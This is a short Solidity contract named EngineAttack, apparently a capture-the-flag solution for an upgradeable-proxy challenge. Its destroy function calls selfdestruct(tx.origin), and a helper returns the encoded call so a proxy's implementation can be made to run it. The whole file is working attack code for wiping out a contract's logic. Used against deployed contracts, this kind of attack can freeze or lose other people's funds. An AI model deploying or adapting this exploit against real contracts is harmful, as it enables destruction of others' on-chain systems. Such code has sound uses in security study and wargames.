// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract EngineAttack {
    function destroy() external {
        selfdestruct(tx.origin);
    }

    function getSignature() external pure returns (bytes memory) {
        return abi.encodeWithSelector(EngineAttack.destroy.selector);
    }
}